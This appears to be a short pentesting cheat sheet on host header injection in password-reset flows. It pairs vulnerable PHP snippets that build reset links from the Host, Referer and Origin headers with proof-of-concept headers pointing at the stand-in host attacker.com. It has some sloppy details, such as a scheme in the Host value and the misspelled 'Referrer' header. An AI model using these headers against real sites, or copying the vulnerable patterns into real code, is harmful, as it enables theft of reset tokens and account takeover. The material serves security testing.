## Header Injection attack vectors 

- Forgot password header injection 

Where applicable a developer may implement the forgot password logic as 

```php 
$ForgotPassURI = "https://{$_SERVER['HTTP_HOST']}/dream-auth/forgot?
registration=$token&email=$email";
```
Changing the header to an attacker controlled on might be possible 

- POC

```sh
Host: https://attacker.com
```

- Load Balancer Host Header Override
  Sometimes there is a load balancer or a reverse proxy server between the users and the server so if developers used the HOST Header they will get the host of load balancer so the developer moves to use the X-Forwarded-Host header because the load balancer saves the original HOST header value in X-Forwarded-Host header
  Anyway, this header should not be modified by the users but some weak load balancers or reverse proxies rewrite this header from user input which makes this header suitable for our test.
- POC

   
```sh
X-Forwarded-Host: https://attacker.com
```

- Referrer Header injection
  Some developers expect that to access the forgot password endpoint you need to come from the main subdomain which makes them use the referer header value in their reset password

```php
$ForgotPassURI = "https://{$_SERVER['HTTP_REFERER']}/dream-auth-forgot?
registration=$token&email=$email";
```
- POC

```sh
Referrer: https://attacker.com
```

- Origin 

```php 
$ForgotPassURI = "https://{$_SERVER['HTTP_ORIGIN']}/dream-auth-forgot?
registration=$token&email=$email";
```

POC 

```Origin: https://attacker.com```

